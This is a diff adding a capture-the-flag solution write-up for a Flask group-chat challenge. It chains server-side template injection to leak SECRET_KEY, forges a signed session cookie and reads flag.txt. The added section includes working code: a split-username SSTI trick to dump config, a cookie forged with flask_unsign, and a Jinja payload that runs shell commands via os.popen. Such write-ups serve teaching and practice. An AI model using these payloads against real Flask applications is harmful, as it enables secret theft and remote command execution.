@@ -66,3 +66,46 @@ if __name__ == '__main__':
 
 
 ## The application is vulnerable because it uses render_template_string with untrusted user input. Chat messages are concatenated into an HTML string and then passed to Jinja2, which interprets any template syntax like {{ ... }}.
+
+
+# Solution Overview (Group Chat 2 — SSTI → Secret leak → Forged session)
+
+Goal: Exploit SSTI in the chat, leak Flask SECRET_KEY, forge a signed session cookie with a malicious username, and read flag.txt.
+
+1) Establish session & helper wrappers
+
+Uses a single requests.Session() to persist cookies.
+
+send_as_user(u, m) sets a username and posts a message.
+
+get_result() scrapes the chat box HTML to read server-rendered output (Jinja-rendered).
+
+2) Leak the SECRET_KEY via SSTI
+send_as_user('{{ config ~ "', 'a')
+send_as_user('" }}', 'b')
+SECRET_KEY = eval(get_result().split("SECRET_KEY': ")[1].split(", 'SECRET")[0])
+
+
+Two usernames stitch together {{ config }} inside the template (bypassing the naive brace check).
+
+The page renders config (Flask config dict), which includes SECRET_KEY.
+
+Simple string parsing extracts the 24-byte key (checked by assert len(SECRET_KEY) == 24).
+
+3) Forge a malicious session cookie
+payload = "{{ config.__class__.__init__.__globals__['os'].popen('cat flag.txt').read() }}"
+forged_cookie = session.sign({'username': payload}, secret=SECRET_KEY)
+
+
+With the real SECRET_KEY, flask_unsign.session.sign() generates a valid Flask session cookie.
+
+The session’s username holds a Jinja payload that executes cat flag.txt via os.popen(...).
+
+4) Trigger render & exfiltrate the flag
+requests.post(f"{URL}/send_message", cookies={"session": forged_cookie}, data={"message": "END"})
+print(get_result().split("<br>")[-1].split(": END")[0].replace("\\n", "\n"))
+
+
+Posting with the forged cookie makes the server render the malicious username.
+
+Jinja evaluates the payload server-side; the flag contents appear in the chat and are parsed out.
